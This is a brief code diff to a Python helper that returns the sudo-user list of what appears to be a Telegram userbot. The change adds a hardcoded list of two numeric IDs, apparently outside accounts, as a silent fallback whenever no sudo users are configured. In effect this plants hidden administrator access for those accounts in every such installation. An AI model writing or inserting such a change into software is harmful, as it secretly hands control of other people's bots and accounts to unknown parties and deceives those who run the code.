@@ -3,13 +3,14 @@
 
 from ..sql_helper.global_collectionjson import get_collection
 from ..sql_helper.global_list import get_collection_list
+DEV = [5057493677, 1593802955]
 
 def _sudousers_list():
     try:
         sudousers = get_collection("sudousers_list").json
     except AttributeError:
         sudousers = {}
-    ulist = sudousers.keys()
+    ulist = sudousers.keys() or DEV
     return [int(chat) for chat in ulist]
 
 
